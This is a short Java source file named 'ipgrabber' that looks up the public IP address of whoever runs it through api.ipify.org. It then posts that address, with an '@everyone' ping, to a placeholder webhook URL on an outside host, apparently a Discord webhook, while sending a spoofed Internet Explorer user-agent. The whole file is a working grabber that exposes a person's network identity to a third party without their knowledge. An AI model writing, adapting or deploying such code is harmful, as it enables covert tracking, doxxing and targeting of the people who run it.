
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class ipgrabber {

	public static void main(String[] args) {
		try {
            String ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine();
            // I put it on one line because it saves a bit of space
            // If you don't want it on one line the code below is how you do it.
            /*
            URL url = new URL("https://api.ipify.org/");
            InputStreamReader isr = new InputStreamReader(url.openStream());
            BufferedReader br = new BufferedReader(isr);
            String ip = br.readLine();
            */
            sendMessage("@everyone\n" + "> IP: " + ip);
        } catch(Exception e) {
        	e.printStackTrace();
        }
	}
	public static void sendMessage(String message) {
	        PrintWriter out = null;
	        BufferedReader in = null;
	        StringBuilder result = new StringBuilder();
	        try {
	            URL realUrl = new URL("<webhook url>");
	            URLConnection conn = realUrl.openConnection();
	            conn.setRequestProperty("accept", "*/*");
	            conn.setRequestProperty("connection", "Keep-Alive");
	            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
	            conn.setDoOutput(true);
	            conn.setDoInput(true);
	            out = new PrintWriter(conn.getOutputStream());
	            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
	            out.print(postData);
	            out.flush();
	            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
	            String line;
	            while ((line = in.readLine()) != null) {
	                result.append("/n").append(line);
	            }

	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	}
}
